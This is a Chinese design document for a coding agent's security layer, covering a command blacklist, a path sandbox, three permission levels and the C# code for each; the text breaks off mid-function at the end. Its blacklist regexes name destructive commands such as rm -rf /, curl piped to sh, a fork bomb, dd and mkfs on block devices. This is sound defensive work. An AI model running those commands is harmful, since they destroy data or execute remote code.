# 迭代 8：安全纵深防御（黑名单 + 路径沙箱 + 三档权限）

> **状态**：[设计完成，待实现]
> **前置迭代**：7c [已完成]、7b [已完成]
> **后续迭代**：9（上下文管理）
> **目标**：在工具执行前构建多层独立的安全防线，单层失效不致命。黑名单始终生效、路径沙箱按档位收紧、三档权限模式决定 HITL 触发策略，拒绝原因回灌 LLM 促其自我修正。
>
> **本文档为总览**，实施拆分为三个子迭代（各自含独立验收标准）：
> - [iter-08a-design.md](iter-08a-design.md)：安全核心（SecurityLevel 迁移 + Blacklist + PathSandbox，纯逻辑）
> - [iter-08b-design.md](iter-08b-design.md)：管线与 Agent 集成（SecurityGuard + 预扫描改造，**回归风险核心**）
> - [iter-08c-design.md](iter-08c-design.md)：配置扩展 + 装配 + 端到端验收

---

## 一、迭代目标

### 1.1 核心目标

把 7a/7b 仅"状态栏显示"的 `SecurityLevel` 升级为**真实拦截管线**，接入 `BatchToolExecutor` 已预留的 `OnBeforeExecuteAsync` hook，实现三层纵深防御：

```
ToolCall
  │
  ▼
① 黑名单（Blacklist）        ← 始终生效，不依赖档位（防 Permissive 下 rm -rf /）
  │ 拦截 → ToolResult.Fail
  ▼
② 路径沙箱（PathSandbox）     ← 按档位收紧（Strict 白名单 / Normal .. 越界 / Permissive 不查）
  │ 拦截 → ToolResult.Fail
  ▼
③ 权限策略（SecurityPolicy） ← 三档模式决定是否需要 HITL（Normal 写询问 / Strict 白名单外拒 / Permissive 放行）
  │ 拦截 → ToolResult.Fail
  ▼
null（放行）→ 交 BatchToolExecutor 后续：HITL（Write 组）→ 执行
```

### 1.2 必须解决的 7a/7b 遗留问题

| 问题 | 7a/7b 现状 | 迭代 8 目标 |
|------|-----------|------------|
| `SecurityLevel` 仅显示不拦截 | 状态栏可见，无实际效果 | **三档真实拦截** |
| `SecurityLevel.Permisive` 拼写错误 | 漏 s（App.cs 还兼容此拼法） | **修正为 `Permissive`**，解析层兼容旧拼法 |
| `SecurityConfig` 只有 Level | 无路径/黑名单配置 | **扩展** allow_paths / deny_paths / extra_blacklist |
| Read 组不过安全层 | `OnBeforeExecuteAsync` 仅 Write 组调用，Read 组直接并发 | **入口预扫描**：所有 calls 统一过安全层 |
| 无黑名单 | `rm -rf /`、`curl\|sh`、fork bomb 等可执行 | **硬编码黑名单**始终拦截 |
| 无路径沙箱 | `..` 遍历、跳出项目根不受限 | **规范化 + 白名单子树检查 + .. 越界检测** |
| 拒绝信息不回灌 | 拦截结果作为 `ToolResult.Fail` 返回但无标准原因格式 | **结构化原因**回灌 LLM，使其调整策略 |

### 1.3 非目标（明确不做）

- ❌ 不改 Agent 层核心（`AgentLoop` / `AgentEvent` / `Channel<AgentEvent>` / `IHitlGate` 接口签名）
- ❌ 不改工具实现（`ReadFileTool` / `WriteFileTool` / `EditFileTool` / `RunCommandTool` 内部逻辑不变，安全检查在外层）
- ❌ 不做黑名单 YAML 配置文件（进阶练习，留作扩展；本迭代用硬编码 + `SecurityConfig.extra_blacklist` 数组）
- ❌ 不做 `AllowPermanent` 持久化（跨会话，迭代 10 JSONL 持久化时接入）
- ❌ 不做运行时切换 `/mode` 命令（迭代 10 斜杠命令系统）
- ❌ 不对 `GlobTool` / `GrepTool` 的 pattern 做沙箱（pattern 非路径，且影响范围有限；仅对其 cwd 参数做校验）
- ❌ 不启用 `ToolBlockedEvent` 的 emit 机制（保留事件类型；拦截走 `ToolResult.Fail` → `ToolResultEvent(失败)` 路径，改动最小）

### 1.4 设计原则

- **纵深防御**：三层独立检查，任一层放行不代表整体放行；任一层拦截即终止。
- **黑名单最高优先级**：即使 `Permissive` 模式也必须拦截黑名单命令（防致命操作）。
- **失败信息回灌**：拒绝原因作为 `ToolResult.Error` 返回 LLM，让它看到"为什么被拒"并调整。
- **安全层不问用户**：黑名单/沙箱/策略拦截时不弹 HITL（避免打扰已被拦截的操作）；只有"策略允许但需询问"才走 HITL。
- **可测试性**：`SecurityGuard` 是纯逻辑类（无 UI/无 IO 依赖），可单测；`SecureBatchToolExecutor` 是薄壳。

---

## 二、现状分析

### 2.1 已预留的接入点

| 位置 | 现状 | 迭代 8 利用方式 |
|------|------|---------------|
| `BatchToolExecutor.OnBeforeExecuteAsync` | 虚方法，默认返回 null；**仅 Write 组调用** | 子类 `SecureBatchToolExecutor` 覆写，委托 `SecurityGuard` |
| `BatchToolExecutor.ExecuteAsync` | Read 组直接并发，不过 hook | 改造：入口预扫描所有 calls，拒绝的填入 results 不进入分组 |
| `IHitlGate` / `HitlPrompt` | 7b/7c 已就绪 | 不变；安全层在其之前执行 |
| `SecurityLevel` 枚举 | `Tui/SecurityLevel.cs`，3 档，拼写 `Permisive` | 迁移到 `Security/`，修正拼写，解析兼容 |
| `SecurityConfig` | 仅 `Level` 字段 | 扩展 allow_paths / deny_paths / extra_blacklist |
| `ToolResult.Fail(error)` | 已有 | 承载拒绝原因回灌 |
| `TerminalApp.StartAgentRound` | 每轮 new `BatchToolExecutor` | 根据配置 new `SecureBatchToolExecutor`（注入 SecurityGuard） |

### 2.2 工具参数与安全检查维度

| 工具 | Category | 安全检查维度 |
|------|----------|-------------|
| `read_file` | Read | path：沙箱（Strict 白名单 / Normal .. 越界） |
| `write_file` | Write | path：沙箱 + Strict 白名单；HITL 询问（Normal） |
| `edit_file` | Write | path：沙箱 + Strict 白名单；HITL 询问（Normal） |
| `glob` | Read | cwd 参数：沙箱（若提供） |
| `grep` | Read | cwd 参数：沙箱（若提供） |
| `run_command` | Write | command+args：黑名单；HITL 询问（Normal） |

> **注**：Read 工具的路径沙箱检查在入口预扫描完成；Write 工具的 HITL 在分组执行阶段（安全层之后）。

---

## 三、架构设计

### 3.1 分层与不变量

```
┌─────────────────────────────────────────────────────┐
│  TUI 层（零改动）                                    │
│  TerminalApp / StatusBarView / HitlPrompt           │  ← 仅装配点改动（注入 SecureBatchToolExecutor）
├─────────────────────────────────────────────────────┤
│  安全层（本迭代新增）                                │  ← 本迭代核心
│  SecurityGuard / Blacklist / PathSandbox / Policy    │
├─────────────────────────────────────────────────────┤
│  Agent 层（小改动）                                  │
│  BatchToolExecutor（入口预扫描）+ SecureBatchTool    │  ← ExecuteAsync 改造 + 子类化
│  Executor（子类，覆写 OnBeforeExecuteAsync）          │
├─────────────────────────────────────────────────────┤
│  抽象接口（不变）                                    │
│  IHitlGate / IBaseTool / ToolCall / ToolResult       │
├─────────────────────────────────────────────────────┤
│  基础设施（小改动）                                  │
│  Config/Models.cs（SecurityConfig 扩展）              │
│  SecurityLevel 迁移到 Security/                       │
└─────────────────────────────────────────────────────┘
```

**核心不变量**：
- `IHitlGate` 接口签名不变
- `AgentEvent` 事件类型不变（12 种，`ToolBlockedEvent` 保留但不启用 emit）
- `Channel<AgentEvent>` 事件流传输不变
- `IBaseTool` / `ToolCall` / `ToolResult` / `ToolCategory` 不变
- 工具实现不变（安全检查在外层）

### 3.2 新增模块：Security/

```
Security/
├── SecurityLevel.cs          # 从 Tui/ 迁移，修正拼写 Permisive → Permissive
├── Models.cs                 # SecurityContext / PathCheckResult 等数据模型
├── Blacklist.cs              # 危险命令黑名单（硬编码 + 配置扩展）
├── PathSandbox.cs             # 路径规范化 + 白名单子树检查 + .. 越界检测
├── SecurityPolicy.cs          # 三档模式策略评估（决定拦截/放行/需询问）
├── SecurityGuard.cs           # 管线编排：黑名单 → 沙箱 → 策略
└── SecureBatchToolExecutor.cs # BatchToolExecutor 子类，覆写 OnBeforeExecuteAsync
```

### 3.3 安全管线流程

```
BatchToolExecutor.ExecuteAsync(calls)
  │
  ▼ 【入口预扫描】对所有 calls 顺序调 OnBeforeExecuteAsync（迭代 8 改造点）
  │
  │  SecureBatchToolExecutor.OnBeforeExecuteAsync(call)
  │    │
  │    ▼ SecurityGuard.CheckAsync(call, ctx)
  │    │   │
  │    │   ▼ ① Blacklist.Match(command) → 命中？ → ToolResult.Fail("黑名单：{rule.Reason}")
  │    │   │
  │    │   ▼ ② PathSandbox.Check(path, level) → 越界？ → ToolResult.Fail("路径越界：{detail}")
  │    │   │
  │    │   ▼ ③ SecurityPolicy.Evaluate(call, level) → 拒绝？ → ToolResult.Fail("策略：{detail}")
  │    │   │
  │    │   ▼ null（放行）
  │    │
  │    ▼ 返回 ToolResult?（null=放行 / Fail=拦截）
  │
  ▼ 拦截的 call：results[i] = blocked，不进入分组
  ▼ 放行的 call：按 Read/Write 分组执行
      │
      ├─ Read 组：并发执行（无 HITL）
      └─ Write 组：OnBeforeExecuteAsync 已在预扫描跑过 → HITL 询问 → 执行
```

> **关键改造**：入口预扫描让 Read 组也过安全层（7b 之前 Read 组直接并发）。Write 组在分组执行阶段不再重复调 `OnBeforeExecuteAsync`（预扫描已覆盖），仅走 HITL。

---

## 四、详细设计

### 4.1 SecurityLevel——迁移与拼写修正

从 `Tui/SecurityLevel.cs` 迁移到 `Security/SecurityLevel.cs`，修正 `Permisive` → `Permissive`。

```csharp
namespace ParrotCode;

/// <summary>
/// 安全等级枚举。迭代 8 接入真实拦截。
/// - Strict: 只允许白名单路径（项目根子树）的读写；白名单外拒绝。
/// - Normal: 读放行、写询问（HITL）；.. 越界拦截。
/// - Permissive: 仅黑名单拦截；路径不检查。
/// 黑名单始终生效（不依赖档位）。
/// </summary>
public enum SecurityLevel
{
    /// <summary>严格：只允许白名单路径读写。</summary>
    Strict,

    /// <summary>普通：读放行、写询问。默认值。</summary>
    Normal,

    /// <summary>宽松：仅黑名单拦截。</summary>
    Permissive
}
```

**兼容性**：`App.ParseSecurityLevel` 解析时同时接受 `"permissive"` 和旧拼法 `"permisive"`，均映射到 `Permissive`。状态栏显示统一为 `Permissive`。

### 4.2 Models——数据模型

```csharp
namespace ParrotCode;

/// <summary>
/// 安全检查上下文：传给 SecurityGuard 的环境信息。
/// 不可变快照（构造时确定）；运行时切换档位通过 SecurityGuard.Level 属性。
/// </summary>
public sealed record SecurityContext
{
    /// <summary>项目根目录（白名单默认根），规范化绝对路径。</summary>
    public required string ProjectRoot { get; init; }

    /// <summary>额外允许的路径白名单（规范化绝对路径）。</summary>
    public IReadOnlyList<string> AllowPaths { get; init; } = Array.Empty<string>();

    /// <summary>显式拒绝的路径黑名单（规范化绝对路径，优先级最高）。</summary>
    public IReadOnlyList<string> DenyPaths { get; init; } = Array.Empty<string>();

    /// <summary>额外黑名单命令模式（正则字符串，与硬编码黑名单合并）。</summary>
    public IReadOnlyList<string> ExtraBlacklist { get; init; } = Array.Empty<string>();
}

/// <summary>
/// 路径检查结果。
/// </summary>
internal enum PathCheckResultKind
{
    Allowed,          // 放行
    DeniedSandbox,    // 路径越界（跳出白名单根）
    DeniedTraversal,  // .. 遍历越界
    DeniedExplicit    // 命中 DenyPaths
}

internal sealed record PathCheckResult(PathCheckResultKind Kind, string? Detail = null)
{
    public bool IsAllowed => Kind == PathCheckResultKind.Allowed;
}
```

### 4.3 Blacklist——危险命令黑名单

**职责**：对 `run_command` 的 `command` + `args` 做模式匹配，命中即拦截。**始终生效**（不依赖 `SecurityLevel`）。

```csharp
using System.Text.RegularExpressions;

namespace ParrotCode;

/// <summary>
/// 危险命令黑名单。硬编码核心规则 + 配置扩展（ExtraBlacklist）。
/// 匹配对象：run_command 工具的 command+args 拼接后的规范化字符串。
/// 非命令工具（read_file/write_file 等）直接放行（返回 null）。
/// </summary>
public sealed class Blacklist
{
    /// <summary>硬编码黑名单规则。Reason 会回灌给 LLM。</summary>
    private static readonly BlacklistRule[] BuiltInRules =
    {
        // 递归删除根/系统目录
        new(@"\brm\s+-[a-zA-Z]*r[a-zA-Z]*f?\s+/(?:\s|$)", "递归删除根目录（rm -rf /）"),
        new(@"\brm\s+-[a-zA-Z]*r[a-zA-Z]*f?\s+/(?:boot|etc|usr|var|bin|sbin|root|home)(?:\s|$)", "递归删除系统目录"),

        // 远程脚本执行（curl/wget 管道到 shell）
        new(@"\b(curl|wget)\b[^|]*\|\s*(sh|bash|zsh|fish)\b", "远程脚本执行（curl|sh）"),
        new(@"\b(curl|wget)\b[^>]*>\s*/dev/(?:sd[a-z]+|nvme\d+n\d+|disk\d+)", "下载写入块设备"),

        // fork bomb
        new(@":\(\)\s*\{\s*:\|:&\s*\}\s*;:", "fork bomb"),

        // 写块设备 / 格式化
        new(@"\bdd\b.*\bof=/dev/(?:sd[a-z]+|nvme\d+n\d+|disk\d+)", "写块设备（dd）"),
        new(@"\bmkfs(?:\.\w+)?\s+/dev/", "格式化块设备（mkfs）"),

        // 权限提升（可选，Strict 下拦截，其余档位警告——本迭代统一拦截）
        // new(@"\bsudo\b", "sudo 权限提升"),
    };

    private readonly Regex[] _extraRules;

    public Blacklist(IReadOnlyList<string> extraPatterns)
    {
        _extraRules = extraPatterns.Select(p => new Regex(p, RegexOptions.Compiled | RegexOptions.IgnoreCase)).ToArray();
    }

    /// <summary>
    /// 检查命令是否命中黑名单。
    /// command/args 取自 run_command 的参数；其他工具返回 null（不适用）。
    /// </summary>
    public BlacklistHit? Match(string command, string args)
    {
        if (string.IsNullOrWhiteSpace(command)) return null;

        // 规范化：合并多余空白，便于正则匹配
        var full = string.IsNullOrEmpty(args) ? command : $"{command} {args}";
        var normalized = Regex.Replace(full, @"\s+", " ").Trim();

        foreach (var rule in BuiltInRules)
        {
            if (rule.Pattern.IsMatch(normalized))
                return new BlacklistHit(rule.Reason);
        }
        foreach (var rule in _extraRules)
        {
            if (rule.IsMatch(normalized))
                return new BlacklistHit($"自定义黑名单规则命中：{rule}");
        }
        return null;
    }
}

internal sealed record BlacklistRule(Regex Pattern, string Reason);

public sealed record BlacklistHit(string Reason);
```

**关键设计点**：
- **规范化空白**：合并多余空格，防止 `rm  -rf  /` 绕过。
- **大小写不敏感**：`RegexOptions.IgnoreCase`，防 `RM -RF /`。
- **边界匹配**：`\b` 和路径分隔符边界，防 `rm -rf /home` 误匹配 `/homeland`。
- **Reason 回灌**：命中原因直接进 `ToolResult.Fail`，LLM 能看到具体规则。

### 4.4 PathSandbox——路径沙箱

**职责**：对带 path/cwd 参数的工具做路径边界检查。按 `SecurityLevel` 收紧。

```csharp
using System.IO;

namespace ParrotCode;

/// <summary>
/// 路径沙箱：规范化 + 白名单子树检查 + .. 越界检测。
/// - Strict: 路径必须在白名单根（ProjectRoot + AllowPaths）子树内，否则拒。
/// - Normal: .. 跳出白名单根的检测；白名单外的绝对路径放行（靠 Write HITL 询问）。
/// - Permissive: 不检查路径。
/// 跨平台：Windows 路径大小写不敏感（OrdinalIgnoreCase），Unix 敏感。
/// </summary>
public sealed class PathSandbox
{
    private readonly SecurityContext _ctx;
    private readonly StringComparison _pathComparison;

    public PathSandbox(SecurityContext ctx)
    {
        _ctx = ctx ?? throw new ArgumentNullException(nameof(ctx));
        _pathComparison = OperatingSystem.IsWindows()
            ? StringComparison.OrdinalIgnoreCase
            : StringComparison.Ordinal;
    }

    /// <summary>
    /// 检查路径是否允许。
    /// rawPath 是工具参数原始值（可能是相对/绝对/含 ..）。
    /// </summary>
    public PathCheckResult Check(string? rawPath, SecurityLevel level)
    {
        if (level == SecurityLevel.Permissive)
            return new PathCheckResult(PathCheckResultKind.Allowed);

        if (string.IsNullOrWhiteSpace(rawPath))
            return new PathCheckResult(PathCheckResultKind.Allowed);  // 空路径交给工具自身报错

        // 1. 显式 DenyPaths（最高优先级，所有非 Permissive 档位生效）
        var normalized = Normalize(rawPath);
        if (IsInPaths(normalized, _ctx.DenyPaths))
            return new PathCheckResult(PathCheckResultKind.DeniedExplicit, $"路径在 DenyPaths 中：{normalized}");

        // 2. .. 越界检测（Normal + Strict）
        // 原始路径含 .. 且规范化后跳出所有白名单根
        if (rawPath.Contains("..") && !IsWithinAnyRoot(normalized))
            return new PathCheckResult(PathCheckResultKind.DeniedTraversal,
                $".. 遍历跳出项目根：{rawPath} → {normalized}");

        // 3. Strict：必须在白名单子树内
        if (level == SecurityLevel.Strict && !IsWithinAnyRoot(normalized))
            return new PathCheckResult(PathCheckResultKind.DeniedSandbox,
                $"Strict 模式：路径不在白名单内：{normalized}");

        return new PathCheckResult(PathCheckResultKind.Allowed);
    }

    /// <summary>规范化为绝对路径（解析 . 和 ..，解析符号链接不做以避免 TOCTOU）。</summary>
    private string Normalize(string rawPath)
    {
        try
        {
            // Path.GetFullPath 解析 . 和 ..，合并相对路径到 ProjectRoot（若相对）
            var baseDir = Directory.GetCurrentDirectory();
            return Path.GetFullPath(rawPath, baseDir);
        }
        catch (Exception)
        {
            // 非法路径（如含非法字符）交给工具报错，沙箱放行
            return rawPath;
        }
    }

    /// <summary>路径是否在任一白名单根子树内。</summary>
    private bool IsWithinAnyRoot(string normalizedPath)
    {
        foreach (var root in GetAllRoots())
        {
            if (IsSameOrUnder(normalizedPath, root))
                return true;
        }
        return false;
    }

    private IEnumerable<string> GetAllRoots()
    {
        yield return _ctx.ProjectRoot;
        foreach (var p in _ctx.AllowPaths) yield return p;
    }

    private bool IsInPaths(string normalizedPath, IReadOnlyList<string> paths)
    {
        foreach (var p in paths)
        {
            if (IsSameOrUnder(normalizedPath, Normalize(p)))
                return true;
        }
        return false;
    }

    /// <summary>child 是否等于或位于 parent 目录下（按操作系统大小写规则）。</summary>
    private bool IsSameOrUnder(string child, string parent)
    {
        if (child.Equals(parent, _pathComparison))
            return true;
        // 确保是目录子树匹配（parent + 分隔符前缀）
        var prefix = parent.EndsWith(Path.DirectorySeparatorChar) ? parent : parent + Path.DirectorySeparatorChar;
        return child.StartsWith(prefix, _pathComparison);
    }
}
```

**关键设计点**：
- **不解析符号链接**：避免 TOCTOU（time-of-check-time-of-use）竞态；`..` 在路径字符串层检测。
- **跨平台大小写**：Windows 用 `OrdinalIgnoreCase`，Unix 用 `Ordinal`。
- **Strict 子树匹配**：`parent + Separator` 前缀，防 `/home/user-evil` 误判为 `/home/user` 子树。
- **Permissive 不查**：黑名单仍生效（在 `SecurityGuard` 层），但路径不查。

### 4.5 SecurityPolicy——三档模式策略评估

**职责**：根据 `SecurityLevel` 决定是否需要拦截或询问。与黑名单/沙箱不同，策略层决定"是否需要 HITL 询问"——但 HITL 实际由 `BatchToolExecutor` 调 `IHitlGate` 完成，策略层只返回"放行/拒绝"，不返回"需询问"（询问由 Write 组 + HITL 机制隐式触发）。

```csharp
namespace ParrotCode;

/// <summary>
/// 三档模式策略评估。
/// 决策矩阵：
/// - Strict:  Write 非白名单路径 → 拒绝（沙箱已拦）；白名单内 Write → 放行交 HITL。
/// - Normal:  Write → 放行交 HITL（BatchToolExecutor 在 Write 组调 IHitlGate）；Read → 放行。
/// - Permissive: 全部放行（仅黑名单拦，黑名单在更早层）。
/// 策略层不直接弹 HITL——HITL 由 BatchToolExecutor 的 Write 组逻辑触发。
/// </summary>
public sealed class SecurityPolicy
{
    private readonly PathSandbox _sandbox;

    public SecurityPolicy(PathSandbox sandbox) => _sandbox = sandbox;

    /// <summary>
    /// 评估是否拦截。null=放行；ToolResult.Fail=拦截。
    /// 不返回"需询问"——询问由 BatchToolExecutor 在 Write 组调 IHitlGate 触发。
    /// </summary>
    public ToolResult? Evaluate(ToolCall call, SecurityLevel level)
    {
        // Strict 模式下，Write 工具的路径必须已在白名单（沙箱层已检查通过才会到这里）
        // 策略层主要处理"档位相关的额外拒绝逻辑"
        // 当前设计下，沙箱层已覆盖 Strict 的白名单检查，策略层无需重复
        // 预留扩展点：如 Strict 下禁止 run_command、Strict 下 Write 需要二次确认等
        return null;  // 默认放行
    }
}
```

> **设计说明**：当前三档模式的核心拦截逻辑由黑名单（始终生效）+ 路径沙箱（按档位收紧）承担。`SecurityPolicy` 作为预留扩展点，保持管线完整性，为迭代 10 的 `/mode` 运行时切换和未来的细粒度策略（如"Strict 下禁止 run_command"）留接口。本迭代 `Evaluate` 默认放行，避免过度设计。

### 4.6 SecurityGuard——管线编排

**职责**：编排黑名单 → 沙箱 → 策略，返回 `ToolResult?`（null=放行 / Fail=拦截）。持有可变 `Level` 属性支持运行时切换（迭代 10）。

```csharp
using System.Text.Json;
using Microsoft.Extensions.Logging;

namespace ParrotCode;

/// <summary>
/// 安全管线编排器：黑名单 → 路径沙箱 → 策略。
/// 三层独立，任一拦截即返回 ToolResult.Fail；全放行返回 null。
/// 拦截不弹 HITL（避免打扰已被拦截的操作）；HITL 由 BatchToolExecutor 在 Write 组后续触发。
/// </summary>
public sealed class SecurityGuard
{
    private readonly Blacklist _blacklist;
    private readonly PathSandbox _sandbox;
    private readonly SecurityPolicy _policy;
    private readonly ILogger? _logger;

    /// <summary>当前安全等级（可运行时 set，为迭代 10 /mode 预留）。</summary>
    public SecurityLevel Level { get; set; }

    public SecurityGuard(SecurityContext context, SecurityLevel level, ILogger? logger = null)
    {
        _blacklist = new Blacklist(context.ExtraBlacklist);
        _sandbox = new PathSandbox(context);
        _policy = new SecurityPolicy(_sandbox);
        Level = level;
        _logger = logger;
    }

    /// <summary>
    /// 检查单个工具调用。null=放行；ToolResult.Fail=拦截（Error 回灌 LLM）。
    /// </summary>
    public Task<ToolResult?> CheckAsync(ToolCall call, CancellationToken ct)
    {
        ToolResult? blocked = null;

        // ① 黑名单（始终生效，不依赖 Level）
        var (cmd, args) = ExtractCommand(call);
        if (cmd is not null)
        {
            var hit = _blacklist.Match(cmd, args);
            if (hit is not null)
            {
                blocked = ToolResult.Fail($"[黑名单] {hit.Reason}");
                _logger?.LogInformation("黑名单拦截工具 {Name}：{Reason}", call.Name, hit.Reason);
            }
        }

        // ② 路径沙箱（按 Level 收紧）
        if (blocked is null)
        {
            var path = ExtractPath(call);
            if (path is not null)
            {
                var result = _sandbox.Check(path, Level);
                if (!result.IsAllowed)
                {
                    blocked = ToolResult.Fail($"[路径沙箱] {result.Detail}");
                    _logger?.LogInformation("沙箱拦截工具 {Name}：{Detail}", call.Name, result.Detail);
                }
            }
        }

        // ③ 策略（档位相关扩展点）
        blocked ??= _policy.Evaluate(call, Level);

        return Task.FromResult(blocked);
    }

    /// <summary>从 ToolCall 提取 run_command 的 command/args。</summary>
    private static (string? Command, string? Args) ExtractCommand(ToolCall call)
    {
        if (call.Name != "run_command") return (null, null);
        var cmd = TryGetString(call.Input, "command");
        var args = TryGetString(call.Input, "args");
        return (cmd, args);
    }

    /// <summary>从 ToolCall 提取 path 或 cwd 参数（read_file/write_file/edit_file/glob/grep）。</summary>
    private static string? ExtractPath(ToolCall call)
    {
        var path = TryGetString(call.Input, "path");
        if (path is not null) return path;
        return TryGetString(call.Input, "cwd");  // glob/grep 的 cwd
    }

    private static string? TryGetString(JsonElement input, string name)
    {
        if (input.ValueKind == JsonValueKind.Object &&
            input.TryGetProperty(name, out var prop) &&
            prop.ValueKind == JsonValueKind.String)
        {
            return prop.GetString();
        }
        return null;
    }
}
```

**关键设计点**：
- **三层顺序**：黑名单（最严格、最廉价）→ 沙箱（路径 IO 略重）→ 策略（扩展点）。短路求值，命中即返回。
- **原因前缀**：`[黑名单]` / `[路径沙箱]` / `[策略]`，便于 LLM 和用户识别拦截来源。
- **Level 可变**：`Level { get; set; }` 为迭代 10 运行时切换预留。
- **纯逻辑**：无 UI/无网络/无实际 IO（路径仅字符串处理），可单测。

### 4.7 SecureBatchToolExecutor——子类化接入

**职责**：继承 `BatchToolExecutor`，覆写 `OnBeforeExecuteAsync`，委托 `SecurityGuard`。同时改造 `ExecuteAsync` 入口预扫描（让 Read 组也过安全层）。

```csharp
namespace ParrotCode;

/// <summary>
/// BatchToolExecutor 子类：注入 SecurityGuard，覆写 OnBeforeExecuteAsync。
/// 安全层在 HITL 之前执行（安全层拒绝时不问用户）。
/// </summary>
public sealed class SecureBatchToolExecutor : BatchToolExecutor
{
    private readonly SecurityGuard _guard;

    public SecureBatchToolExecutor(
        ToolExecutor executor,
        ToolRegistry registry,
        SecurityGuard guard,
        int maxParallelism = 5,
        IHitlGate? hitlGate = null,
        ILogger? logger = null)
        : base(executor, registry, maxParallelism, hitlGate, logger)
    {
        _guard = guard ?? throw new ArgumentNullException(nameof(guard));
    }

    protected override async Task<ToolResult?> OnBeforeExecuteAsync(ToolCall call, CancellationToken ct) =>
        await _guard.CheckAsync(call, ct);
}
```

### 4.8 BatchToolExecutor.ExecuteAsync 改造——入口预扫描

**改动**：让所有 calls（Read + Write）在分组执行前统一过 `OnBeforeExecuteAsync`，拒绝的不进入分组。Write 组执行阶段不再重复调 `OnBeforeExecuteAsync`（预扫描已覆盖）。

```csharp
public async Task<IReadOnlyList<ToolResult>> ExecuteAsync(IReadOnlyList<ToolCall> calls, CancellationToken cancellationToken)
{
    ArgumentNullException.ThrowIfNull(calls);
    if (calls.Count == 0) return Array.Empty<ToolResult>();
    cancellationToken.ThrowIfCancellationRequested();

    var results = new ToolResult[calls.Count];
    var pending = new List<int>(calls.Count);

    // 【迭代 8 改造】入口预扫描：对所有 calls 调 OnBeforeExecuteAsync（安全层）
    // 拒绝的填入 results 不进入分组；放行的加入 pending
    for (var i = 0; i < calls.Count; i++)
    {
        cancellationToken.ThrowIfCancellationRequested();
        var blocked = await OnBeforeExecuteAsync(calls[i], cancellationToken);
        if (blocked is not null)
        {
            results[i] = blocked;
            _logger?.LogInformation("工具 {Name} 被安全层拦截", calls[i].Name);
        }
        else
        {
            pending.Add(i);
        }
    }

    if (pending.Count == 0)
        return results;

    // 分组（只对 pending）
    var readIndices = new List<int>();
    var writeIndices = new List<int>();
    foreach (var i in pending)
    {
        var tool = _registry.Get(calls[i].Name);
        if (tool is null || tool.Category != ToolCategory.Read)
            writeIndices.Add(i);
        else
            readIndices.Add(i);
    }

    // Read 组并发（分批限流）——无 HITL
    foreach (var batch in readIndices.Chunk(_maxParallelism))
    {
        cancellationToken.ThrowIfCancellationRequested();
        var tasks = batch.Select(i => _executor.ExecuteAsync(calls[i], cancellationToken)).ToArray();
        var batchResults = await Task.WhenAll(tasks);
        for (var j = 0; j < batch.Length; j++)
            results[batch[j]] = batchResults[j];
    }

    // Write 组串行 + HITL（迭代 8：OnBeforeExecuteAsync 已在预扫描跑过，此处不再调）
    foreach (var i in writeIndices)
    {
        cancellationToken.ThrowIfCancellationRequested();
        var call = calls[i];

        // HITL 请求（hitlGate 非 null 时）
        if (_hitlGate is not null)
        {
            var decision = await _hitlGate.RequestAsync(call, cancellationToken);
            if (decision is { IsAllowed: false })
            {
                results[i] = ToolResult.Fail(decision.Reason ?? "用户拒绝执行");
                _logger?.LogInformation("HITL 拒绝工具 {Name}", call.Name);
                continue;
            }
        }

        results[i] = await _executor.ExecuteAsync(call, cancellationToken);
    }

    return results;
}
```

**关键改动点**：
1. **入口预扫描**：`for` 循环对所有 calls 调 `OnBeforeExecuteAsync`，拒绝的填 `results[i]`，放行的进 `pending`。
2. **Read 组也过安全层**：`pending` 包含 Read 索引，分组后 Read 组执行（安全层已在预扫描跑过）。
3. **Write 组不再重复调 `OnBeforeExecuteAsync`**：预扫描已覆盖，直接走 HITL → 执行。
4. **向后兼容**：基类 `BatchToolExecutor`（非 Secure 子类）的 `OnBeforeExecuteAsync` 仍返回 null，预扫描全放行，行为与 7b 一致（7b 测试不受影响）。

> **对 7b 测试的影响**：`BatchToolExecutorHitlTests` 用基类 `BatchToolExecutor`（`OnBeforeExecuteAsync` 返回 null），预扫描全放行，Read/Write 分组执行不变，HITL 逻辑不变。现有测试应全绿。如个别测试断言"Read 组不调 OnBeforeExecuteAsync"，需适配（预期内改动）。

### 4.9 配置扩展——SecurityConfig

```csharp
/// <summary>安全配置（迭代 8 接入真实拦截）。</summary>
public sealed record SecurityConfig
{
    /// <summary>安全等级："strict" | "normal"（默认）| "permissive"。大小写不敏感。</summary>
    public string? Level { get; init; }

    /// <summary>额外允许的路径白名单（绝对或相对项目根）。Strict 模式下只允许这些路径 + 项目根的读写。</summary>
    public IList<string> AllowPaths { get; init; } = Array.Empty<string>();

    /// <summary>显式拒绝的路径（最高优先级，所有非 Permissive 档位生效）。</summary>
    public IList<string> DenyPaths { get; init; } = Array.Empty<string>();

    /// <summary>额外黑名单命令正则模式（与硬编码黑名单合并）。</summary>
    public IList<string> ExtraBlacklist { get; init; } = Array.Empty<string>();
}
```

**示例 YAML**（`.parrotcode.yaml`）：

```yaml
security:
  level: strict
  allow_paths:
    - d:/projects/shared-libs
    - ../sibling-project
  deny_paths:
    - d:/secrets
  extra_blacklist:
    - "\\bkubectl\\s+delete\\b"
    - "\\bdocker\\s+rm\\s+-f"
```

### 4.10 TerminalApp 装配改动

```csharp
private void StartAgentRound()
{
    var executor = new ToolExecutor(_registry!, TimeSpan.FromSeconds(_agentConfig.ToolTimeoutSeconds ?? 30), _logger);

    IHitlGate? hitlGate = _hitlPrompt is null ? new NullHitlGate() : (IHitlGate)_hitlPrompt;

    // 【迭代 8 改造】根据 SecurityLevel 装配 SecureBatchToolExecutor 或基类
    BatchToolExecutor batchExecutor;
    if (_securityGuard is not null)
    {
        // 同步当前档位（支持运行时切换预留）
        _securityGuard.Level = _securityLevel;
        batchExecutor = new SecureBatchToolExecutor(
            executor, _registry!, _securityGuard,
            _agentConfig.MaxParallelism ?? 5, hitlGate, _logger);
    }
    else
    {
        // 无安全配置（理论上不发生，App 总会构造 SecurityGuard）——回退基类
        batchExecutor = new BatchToolExecutor(
            executor, _registry!,
            _agentConfig.MaxParallelism ?? 5, hitlGate, _logger);
    }

    _sink = new ChannelEventSink();
    var agentLoop = new AgentLoop(_provider, _registry!, batchExecutor,
                                   _agentConfig.MaxRounds ?? 10,
                                   _agentConfig.ToolChoice ?? "auto",
                                   _agentConfig.SystemPrompt, logger: null);
    _agentTask = agentLoop.RunAsync(_history!, _sink, _ct);
}
```

`App.RunAsync` 中构造 `SecurityContext` + `SecurityGuard` 并传入 `TerminalApp`：

```csharp
public async Task RunAsync()
{
    var tuiConfig = _config.Tui ?? new TuiConfig();
